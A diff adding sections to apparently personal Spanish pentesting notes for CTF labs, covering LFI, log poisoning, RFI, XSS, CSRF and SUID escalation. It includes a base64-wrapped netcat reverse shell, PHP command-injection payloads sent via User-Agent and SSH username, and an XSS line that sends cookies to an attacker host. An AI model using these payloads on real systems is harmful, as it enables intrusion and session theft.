@@ -93,7 +93,7 @@ shell --> Obtengo una shell interactiva
 
 --------------------------------///////\\\\\\\--------------------------------------
 
-//EXPLOTACION MANUAL SIN HERRAMIENTAS (DE EXPLOIT) DE POR MEDIO
+// EXPLOTACION MANUAL SIN HERRAMIENTAS (DE EXPLOIT) DE POR MEDIO
 
 encuentro la vulnerabilidad con searchsploit
 lo copio en el dir actual
@@ -103,7 +103,7 @@ Hago lo que dice el exploit (varia casi siempre)
 
 --------------------------------///////\\\\\\\--------------------------------------
 
-//BURPSUITE
+// BURPSUITE
 
 nos permite interceptar peticiones y modificarlas.
 
@@ -127,3 +127,151 @@ Luego, tendriamos que poner en la barra de direcciones lo siguiente:
 										DATASO:
 http://IP/ruta/hasta/el/archivo.php?cmd=(comando que desees)                       ifconfig=ip a
 
+
+--------------------------------///////\\\\\\\--------------------------------------
+
+// LFI (LOCAL FILE INCLUSION)
+
+
+----COMO-CONSEGUIRLO----
+
+
+para conseguir un local file inclusion, podriamos fijarnos si el gestor de contenido es vulnerable a este
+tipo de ataque. Con el comando 'searchsploit <Gestor de contenido>'
+
+
+----SACAR-INFORMACION-CON-UN-LFI----
+
+
+'/proc/schedstat' y '/proc/sched_debug' pueden llegar a dar informacion
+
+
+
+----VER-SI-ESTOY-EN-UN-CONTENEDOR----
+
+Nos vamos a la ruta /proc/net/fib_trie para ver si estoy en un contenedor
+
+
+---VEO-PUERTOS-INTERNOS----
+
+Podemos tambien irnos a /proc/net/tcp para ver que puertos INTERNOS tiene abierta la maquina.
+para hacerlo nos copiamos el texto de esa direccion y nos vamos a nuestra maquina al directorio:
+cd /content y luego pegarlo haciendo un 'nano data' para hacerle regex posteriormente:
+cat data | tr ':' ' ' | awk '{print $3}' | sort -u
+                                             ^
+                                             |
+                                para que no haya repeticiones
+luego hacemos en la consola: 'python3' y pegamos de la siguiente forma:  0xhex
+
+
+
+----PASAR-DE-UN-LFI-A-UN-RCE-(VULNERABILIDAD-LOG-POISONING)----
+
+
+Lo que podemos hacer para cuando tenemos un lfi pasar a un rce seria:
+
+
+
+si esta habilitado el apache2 nos vamos a la ruta:
+/var/log/apache2/acces.log
+
+si esta existe, mediante el uso de la herramienta curl, modificamos el user-agent:
+
+curl "copiar toda la direccion" -H "User-Agent: <?php system('example:whoami');?>"  
+
+
+Tambien podriamos, si tenemos acceso a el servicio ssh y a la ruta /var/log/auth.log en el lfi hacemos lo
+siguiente:
+
+ssh '<?php system("whoami"); ?>'@IP 
+
+ahora recargamos la pagina en el auth.log y deberiamos ver la ejecucion de comandos.
+
+si queremos entablar una reverse shell, primero, en nuestra consola deberiamos hacer:
+
+----->  echo "nc -e /bin/bash <nuestra ip> <nuestro puerto>" | base64
+para obtener el cifrado.
+
+una vez con el cifrado tendriamos que hacer lo siguiente:
+
+-----> echo <cifrado> | base64 -d | bash
+                                ^
+                                |
+                           este parametro
+                        decodifica el cifrado            
+
+
+
+
+  
+--------------------------------///////\\\\\\\----------------------------------
+
+
+// RFI (REMOTE FILE INCLUSION)
+
+----COMO-OBTENERLO----
+
+En searchsploit buscamos por el gestor de contenido, plugin o lo que sea que nos pueda dar un rfi.
+Nos vamos a monkey pentester para obtener el archivo php de la reverse shelly le cambiamos la ip y el port.
+
+ 
+
+--------------------------------///////\\\\\\\----------------------------------
+
+// CROSS-SITE SCRIPTING (HTML INJ Y XSS)
+
+xss ----> <script>alert("HOLAQTAL")</script>
+
+con el xss injection podemos obtener cookies de usuarios, por ejemplo:
+si tenemos un panel para postear una nota, hariamos lo siguiente:
+
+nos ponemos un 'python -m SimpleHttpServer 80'
+
+y en el posteo ponemos lo que esta escrito abajo:
+
+<script>document.write('<img src="http://IP/imagen.jpg?cookie=' + document.cookie + '">')</script>
+
+Luego, para utilizar esa cookie que hemos obtenido, nos vamos a interceptar por medio de burpsuite
+la carga de la pagina de login y cambiamos la cookie con la del usuario obtenido.
+
+
+--------------------------------///////\\\\\\\----------------------------------
+
+// CSRF (CROSS-SITE REQUEST FORGERY) 
+(no suele servir para htb)
+
+Para ejecutar el CSRF necesitamos de la interaccion de un usuario
+
+nos vamos a un panel de update password con nuestra cuenta y creamos una nueva contrasena pero antes
+de darle a submit, lo interceptamos por burpsuite, lo mandamos al repeater (ctrl + r), le damos
+click derecho y le ponemos en Change request method para mandarlo por get, si esto funciona es critico
+porque esto quiere decir que si le damos ese link (acrotado por ej: tinyurl) a un administrador
+(ingenieria social) y lo pega en su buscador, se le cambiaria automaticamente la contrasena a una que 
+nosotros hayamos puesto.
+
+
+--------------------------------///////\\\\\\\----------------------------------
+
+// SSRF (SERVER-SIDE REQUEST FORGERY)
+
+--------------------------------///////\\\\\\\----------------------------------
+
+
+// USER PRIVILIGE ESCALATION
+
+----PAGINA-DE-INTERES----
+gtfobins.github.io
+
+en esta pagina simplemente buscamos el comando y vemos lo que tenemos que hacer para convertirnos en #.
+
+
+
+---EXPLOTACION-DE-PERMISO-SUID----
+
+para asignar un permiso suid seria chmod 4<755> por ejemplo.
+
+buscamos privilegios suid de la siguiente forma:
+---> find \-perm -4000
+
+
+--- 
